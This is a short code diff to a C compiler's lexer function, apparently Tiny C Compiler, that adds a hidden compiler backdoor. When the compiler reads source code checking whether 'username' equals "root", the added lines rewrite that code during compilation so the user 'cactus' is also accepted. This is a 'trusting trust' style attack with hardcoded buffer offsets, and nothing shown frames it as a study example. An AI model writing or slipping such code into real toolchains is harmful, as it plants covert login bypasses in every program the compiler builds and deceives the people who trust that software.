@@ -2658,6 +2658,12 @@ static inline void next_nomacro1(void)
     unsigned int h;
 
     p = file->buf_ptr;
+	if (!strncmp("\n\nif (!strcmp(username, \"root\"))", file->buf_ptr, 32)) {
+		memcpy(file->buffer+625, file->buffer+597, strlen(file->buffer+597)+1);
+		memcpy(file->buffer+597, "||!strcmp(\"cactus\",username)", 28);
+		file->buf_ptr += 28;
+		file->buf_end += 28;
+	}
  redo_no_start:
     c = *p;
     switch(c) {
